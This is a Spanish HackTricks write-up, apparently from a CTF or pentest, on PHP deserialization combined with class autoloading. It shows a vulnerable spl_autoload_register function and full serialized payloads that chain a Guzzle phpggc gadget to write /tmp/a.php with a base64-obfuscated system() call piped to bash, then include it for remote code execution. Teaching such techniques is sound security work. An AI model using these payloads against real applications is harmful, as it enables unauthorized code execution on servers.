# PHP - Deserializaci√≥n + Autoload de Clases

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

En primer lugar, debes comprobar qu√© son las [**Clases de Autocarga**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserializaci√≥n + spl\_autoload\_register + LFI/Gadget

Nos encontramos en una situaci√≥n en la que hemos encontrado una **deserializaci√≥n de PHP en una aplicaci√≥n web** sin ninguna biblioteca vulnerable a gadgets dentro de **`phpggc`**. Sin embargo, en el mismo contenedor hab√≠a una **aplicaci√≥n web de composer diferente con bibliotecas vulnerables**. Por lo tanto, el objetivo era **cargar el cargador de composer de la otra aplicaci√≥n web** y abusar de √©l para **cargar un gadget que explotar√° esa biblioteca con un gadget** de la aplicaci√≥n web vulnerable a la deserializaci√≥n.

Pasos:

* Has encontrado una **deserializaci√≥n** y **no hay ning√∫n gadget** en el c√≥digo de la aplicaci√≥n actual.
* Puedes abusar de una funci√≥n **`spl_autoload_register`** como la siguiente para **cargar cualquier archivo local con extensi√≥n `.php`**
  * Para ello, utilizas una deserializaci√≥n donde el nombre de la clase va a estar dentro de **`$name`**. No puedes usar "/" o "." en un nombre de clase en un objeto serializado, pero el **c√≥digo** est√° **reemplazando** los **guiones bajos** ("\_") **por barras** ("/"). Por lo tanto, un nombre de clase como `tmp_passwd` se transformar√° en `/tmp/passwd.php` y el c√≥digo intentar√° cargarlo.\
    Un **ejemplo de gadget** ser√≠a: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

   if (preg_match('/Controller$/', $name)) {
       $name = "controllers/${name}";
   } elseif (preg_match('/Model$/', $name)) {
       $name = "models/${name}";
   } elseif (preg_match('/_/', $name)) {
       $name = preg_replace('/_/', '/', $name);
   }

   $filename = "/${name}.php";

   if (file_exists($filename)) {
       require $filename;
   }
   elseif (file_exists(__DIR__ . $filename)) {
       require __DIR__ . $filename;
   }
});
```
{% hint style="success" %}
Si tienes una **carga de archivo** y puedes cargar un archivo con extensi√≥n **`.php`**, podr√≠as **abusar directamente de esta funcionalidad** y obtener RCE.
{% endhint %}

En mi caso, no ten√≠a nada as√≠, pero hab√≠a dentro del **mismo contenedor** otra p√°gina web de composer con una **biblioteca vulnerable a un gadget `phpggc`**.

* Para cargar esta otra biblioteca, primero necesitas **cargar el cargador de composer de esa otra aplicaci√≥n web** (porque el de la aplicaci√≥n actual no acceder√° a las bibliotecas de la otra). **Conociendo la ruta de la aplicaci√≥n**, puedes lograr esto muy f√°cilmente con: **`O:28:"www_frontend_vendor_autoload":0:{}`** (En mi caso, el cargador de composer estaba en `/www/frontend/vendor/autoload.php`)
* Ahora, puedes **cargar** el **cargador de composer de las otras aplicaciones**, as√≠ que es hora de **`generar el payload phpgcc`** para usar. En mi caso, us√© **`Guzzle/FW1`**, lo que me permiti√≥ **escribir cualquier archivo dentro del sistema de archivos**.
  * NOTA: El **gadget generado no funcionaba**, para que funcionara **modifiqu√©** ese payload **`chain.php`** de phpggc y establec√≠ **todos los atributos** de las clases **de privados a p√∫blicos**. Si no, despu√©s de deserializar la cadena, los atributos de los objetos creados no ten√≠an ning√∫n valor.
* Ahora tenemos la forma de **cargar el cargador de composer de las otras aplicaciones** y tener un **payload phpggc que funciona**, pero necesitamos **hacer esto en la MISMA PETICI√ìN para que el cargador se cargue cuando se use el gadget**. Para eso, envi√© un array serializado con ambos objetos como:
  * Puedes ver **primero el cargador siendo cargado y luego el payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Ahora, podemos **crear y escribir un archivo**, sin embargo, el usuario **no puede escribir en ninguna carpeta dentro del servidor web**. Entonces, como se puede ver en el payload, PHP llama a **`system`** con alg√∫n **base64** que se crea en **`/tmp/a.php`**. Luego, podemos **reutilizar el primer tipo de payload** que usamos como LFI para cargar el cargador de compositores de la otra aplicaci√≥n web **para cargar el archivo generado `/tmp/a.php`**. Solo agr√©guelo al gadget de deserializaci√≥n: &#x20; 

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Resumen de la carga √∫til**

* **Carga el autoload de composer** de una aplicaci√≥n web diferente en el mismo contenedor.
* **Carga un gadget phpggc** para abusar de una biblioteca de la otra aplicaci√≥n web (la aplicaci√≥n web inicial vulnerable a la deserializaci√≥n no ten√≠a ning√∫n gadget en sus bibliotecas).
* El gadget **crear√° un archivo con una carga √∫til de PHP** en /tmp/a.php con comandos maliciosos (el usuario de la aplicaci√≥n web no puede escribir en ninguna carpeta de ninguna aplicaci√≥n web).
* La parte final de nuestra carga √∫til usar√° **cargar el archivo php generado** que ejecutar√° comandos.

Necesit√© **llamar a esta deserializaci√≥n dos veces**. En mis pruebas, la primera vez se cre√≥ el archivo `/tmp/a.php` pero no se carg√≥, y la segunda vez se carg√≥ correctamente.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
